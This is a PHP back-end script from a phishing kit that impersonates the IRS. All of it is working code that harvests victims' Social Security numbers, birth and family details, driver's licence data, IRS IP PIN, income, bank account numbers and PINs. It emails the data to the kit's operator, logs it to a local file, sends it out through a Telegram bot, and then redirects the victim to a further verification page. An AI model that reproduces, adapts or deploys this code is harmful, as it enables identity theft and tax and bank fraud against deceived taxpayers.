<?php



include('email.php');

$subject = "IRS Login Infos ";
$headers = "From: chigo <IRS>\r\n";
$message = "
[+] IRS Info  [+]
[IP]                    : ".$_SERVER['REMOTE_ADDR']."
[FNAME]       		    : ".$_POST['fnam']."
[LNAME] 				: ".$_POST['lnam']."
[DOB_YY_MM_DD]			: ".$_POST['dob']."
[SSN] 		   		    : ".$_POST['ssn']."
[ADDRESS] 				: ".$_POST['addy']."
[CITY] 					: ".$_POST['cty']."
[STATE] 				: ".$_POST['stt']."
[ZIP] 					: ".$_POST['zip']."
[PHONE] 				: ".$_POST['pno']."
[MMN] 		    		: ".$_POST['mmn']."
[FATHER_NAME] 			: ".$_POST['ffn']."
[CITY_BIRTH] 			: ".$_POST['cb']."
[STATE_BIRTH] 		    : ".$_POST['sb']."
[DL_NUMBER]             : ".$_POST['dl']."
[DL_ISSUE_DATE]         : ".$_POST['idl']."
[DL_EXPIRATION_DATE]    : ".$_POST['edl']."
[AMOUNT] 				: ".$_POST['amt']."
[IP_PIN] 				: ".$_POST['ipin']."
[TAX_RECORD] 			: ".$_POST['txr']."
[ADJUSTED_GROSS_INCOME] : ".$_POST['agi']."
[BANK_NAME] 			: ".$_POST['bnk']."
[ACCT_NUMBER] 		    : ".$_POST['act']."
[ACCT_PIN]              : ".$_POST['pin']."
----------------------------------\n
**********************************\n
**********************************\n";
mail($email,$subject,$message,$headers);
$text = fopen('stored.txt', 'a');
fwrite($text, $message);

/* Telegram */

function sendMessage($messaggio) {
    global $botToken, $chatId;
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text=" . urlencode($messaggio);
    $ch = curl_init();
    curl_setopt_array($ch, array(CURLOPT_URL => $url,CURLOPT_RETURNTRANSFER => true));
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
sendMessage($message);
header("Location: verify.php");

?>